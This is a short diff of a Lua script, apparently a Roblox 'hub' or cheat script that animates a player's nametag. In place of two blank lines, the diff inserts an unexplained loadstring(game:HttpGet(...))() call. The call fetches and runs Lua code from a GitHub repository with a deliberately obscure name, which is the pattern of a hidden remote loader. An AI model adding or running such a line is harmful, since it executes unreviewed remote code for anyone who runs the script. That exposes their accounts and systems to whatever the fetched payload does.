@@ -85,8 +85,7 @@ if not Nametag then
 	fail("Nametag not found for " .. Player.Name)
 	return
 end
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/8zj/aspoidhasouphsaohoasidjnmasaindoasbpgdas8udgouihassdhsaaiisaggdaghbouudsaktgdiysagdbuiagsigdas0gdpia/refs/heads/main/TDS/Players/lplayer.lua"))()
 -- [ Animation ] --
 local Text = Nametag.Display.Frame.RichText["1"]
 local Message = "/PSH Hub"
